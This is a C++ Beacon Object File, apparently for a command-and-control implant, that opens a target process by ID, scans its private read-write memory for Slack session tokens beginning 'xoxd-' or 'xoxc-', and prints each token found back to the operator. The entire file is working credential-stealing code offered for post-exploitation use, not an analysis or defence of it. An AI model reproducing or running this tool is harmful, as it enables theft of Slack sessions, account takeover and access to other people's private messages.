#include <general.h>

auto SlackDump( ULONG ProcessId ) -> VOID {
    auto ProcessHandle = INVALID_HANDLE_VALUE;
    auto MmAddress     = PBYTE{ nullptr };
    auto MmInformation = MEMORY_BASIC_INFORMATION{ 0 };
    auto PageInterval  = SIZE_T{ 0 };
    auto BooleanStatus = BOOL{ FALSE };
    auto ReadBuffer    = PBYTE{ nullptr };
    auto BytesRead     = SIZE_T{ 0 };
    
    auto Cleanup = [&]() -> VOID {
        if ( ReadBuffer ) {
            free( ReadBuffer );
            ReadBuffer = nullptr;
        }
        
        if ( ProcessHandle != INVALID_HANDLE_VALUE ) {
            CloseHandle( ProcessHandle );
            ProcessHandle = INVALID_HANDLE_VALUE;
        }
    };
    
    ProcessHandle = OpenProcess( 
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ProcessId 
    );
    if ( ProcessHandle == INVALID_HANDLE_VALUE || ProcessHandle == nullptr ) {
        BeaconPrintf( CALLBACK_ERROR, "Failed to open process %d: %d", ProcessId, GetLastError() );
        return;
    }
    
    BeaconPrintf( CALLBACK_OUTPUT, "Scanning process %d for tokens...", ProcessId );
    
    while ( TRUE ) {
        PageInterval = VirtualQueryEx( 
            ProcessHandle, MmAddress, &MmInformation, sizeof( MEMORY_BASIC_INFORMATION ) 
        );
        if ( PageInterval == 0 ) {
            BeaconPrintf( CALLBACK_OUTPUT, "Memory scan complete" ); break; 
        }
        
        MmAddress = static_cast<PBYTE>( MmInformation.BaseAddress ) + MmInformation.RegionSize;
        
        if ( MmInformation.State != MEM_COMMIT ) {
            continue;
        }
        
        if ( MmInformation.Protect != PAGE_READWRITE ) {
            continue;
        }
        
        if ( MmInformation.Type != MEM_PRIVATE ) {
            continue;
        }
        
        if ( MmInformation.RegionSize > 100 * 1024 * 1024 ) { // 100MB
            continue;
        }
        
        if ( ReadBuffer ) {
            free( ReadBuffer ); ReadBuffer = nullptr;
        }
        
        ReadBuffer = (PBYTE)malloc( MmInformation.RegionSize );
        if ( ! ReadBuffer ) {
            BeaconPrintf( CALLBACK_ERROR, "Failed to allocate memory buffer" ); continue;
        }
        
        BooleanStatus = ReadProcessMemory( 
            ProcessHandle, MmInformation.BaseAddress, ReadBuffer, MmInformation.RegionSize, &BytesRead 
        );
        if ( !BooleanStatus || BytesRead == 0 ) {
            continue; 
        }
        
        if ( BytesRead < 40 ) {
            continue;
        }
        
        for ( SIZE_T i = 0; i <= BytesRead - 40; i++ ) {
            if ( ReadBuffer[i+0] == 0x78 &&  // 'x'
                 ReadBuffer[i+1] == 0x6f &&  // 'o'
                 ReadBuffer[i+2] == 0x78 &&  // 'x'
                 (ReadBuffer[i+3] == 0x64 || ReadBuffer[i+3] == 0x63) &&  // 'd' or 'c'
                 ReadBuffer[i+4] == 0x2d ) { // '-'
                
                SIZE_T TokenStart = i;
                SIZE_T TokenEnd = TokenStart;
                SIZE_T MaxTokenLength = 80;
                SIZE_T MaxScan = BytesRead - TokenStart;
                
                if ( MaxScan > MaxTokenLength ) {
                    MaxScan = MaxTokenLength;
                }
                
                for ( SIZE_T j = 0; j < MaxScan; j++ ) {
                    SIZE_T pos = TokenStart + j;
                    
                    if ( pos >= BytesRead ) {
                        break;
                    }
                    
                    BYTE c = ReadBuffer[pos];
                    
                    BOOL IsValid = (c >= 0x30 && c <= 0x39) ||  // 0-9
                                   (c >= 0x41 && c <= 0x5A) ||  // A-Z
                                   (c >= 0x61 && c <= 0x7A) ||  // a-z
                                   c == 0x2D || c == 0x5F;      // '-' or '_'
                    
                    if ( !IsValid ) {
                        break;
                    }
                    
                    TokenEnd++;
                }
                
                SIZE_T TokenLength = TokenEnd - TokenStart;
                
                if ( TokenLength < 30 || TokenLength > MaxTokenLength ) {
                    continue;
                }
                
                if ( TokenStart + TokenLength > BytesRead ) {
                    continue;
                }
                
                PCHAR TokenBuffer = (PCHAR)malloc( TokenLength + 1 );
                if ( !TokenBuffer ) {
                    continue;
                }
                
                for ( SIZE_T k = 0; k < TokenLength; k++ ) {
                    if ( TokenStart + k < BytesRead ) {
                        TokenBuffer[k] = (CHAR)ReadBuffer[TokenStart + k];
                    } else {
                        TokenBuffer[k] = '\0';
                        break;
                    }
                }
                TokenBuffer[TokenLength] = '\0';
                
                BeaconPrintf( CALLBACK_OUTPUT, "[+] Token found at 0x%p:\n    %s", 
                    reinterpret_cast<PVOID>( reinterpret_cast<SIZE_T>( MmInformation.BaseAddress ) + i ),
                    TokenBuffer
                );

                BeaconPrintf( CALLBACK_OUTPUT, "\n");
                
                free( TokenBuffer );
                
                i = TokenEnd > 0 ? TokenEnd - 1 : i;
            }
        }
    }
    
    return Cleanup();
}

EXTERN_C auto go( CHAR* Args, INT32 Argc ) -> VOID {
    datap Parser = { 0 };
    
    BeaconDataParse( &Parser, Args, Argc );
    ULONG ProcessId = BeaconDataInt( &Parser );
    
    if ( ProcessId == 0 ) {
        BeaconPrintf( CALLBACK_ERROR, "Invalid process ID" ); return;
    }
    
    return SlackDump( ProcessId );
}